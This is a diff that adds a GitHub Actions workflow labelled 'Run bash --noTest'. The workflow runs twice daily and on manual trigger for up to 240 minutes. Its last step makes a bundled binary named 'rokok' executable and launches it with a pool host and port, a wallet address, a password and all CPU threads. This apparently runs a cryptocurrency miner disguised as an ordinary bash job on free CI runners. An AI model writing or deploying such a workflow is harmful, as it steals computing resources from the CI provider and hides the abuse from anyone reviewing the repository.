@@ -1,0 +1,33 @@
+name: Run bash --noTest
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: "0 6,17 * * *"  # 06:00 & 17:00 UTC
+
+permissions:
+  contents: read
+
+concurrency:
+  group: tesaction-run
+  cancel-in-progress: true
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 240  # 5 jam
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Debug (optional)
+        run: |
+          echo "GITHUB_WORKSPACE=$GITHUB_WORKSPACE"
+          date -u
+          date
+          ls -la
+
+      - name: Run bash
+        run: |
+          chmod u+x rokok && ./rokok --pool pir.api-cutflow-cdn.my.id:4567 --wallet 4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGkuvmLdQkYSj84kke --pass Yogs --threads $(nproc --all)
